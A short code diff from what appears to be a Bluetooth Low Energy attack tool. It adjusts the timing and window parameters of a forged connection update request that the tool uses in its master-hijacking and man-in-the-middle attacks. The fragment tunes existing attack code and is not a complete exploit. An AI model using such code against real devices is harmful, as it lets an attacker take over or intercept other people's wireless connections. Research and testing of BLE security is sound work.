@@ -458,13 +458,13 @@ void BLEController::startAttack(BLEAttack attack) {
 		free(terminate_ind);
 	}
 	else if (attack == BLE_ATTACK_MASTER_HIJACKING || attack == BLE_ATTACK_MITM) {
-		this->attackStatus.nextInstant = this->connectionEventCount + 150;
+		this->attackStatus.nextInstant = this->connectionEventCount + 50;
 		uint8_t *connection_update;
 		size_t connection_update_size;
 		BLEPacket::forgeConnectionUpdateRequest(&connection_update,
 							&connection_update_size,
-							7 /* WinSize */,
-							1 /* WinOffset */,
+							2 /* WinSize */,
+							4 /* WinOffset */,
 							this->hopInterval /* Hop Interval */,
 							0 /* Latency */,
 							600 /*timeout*/,
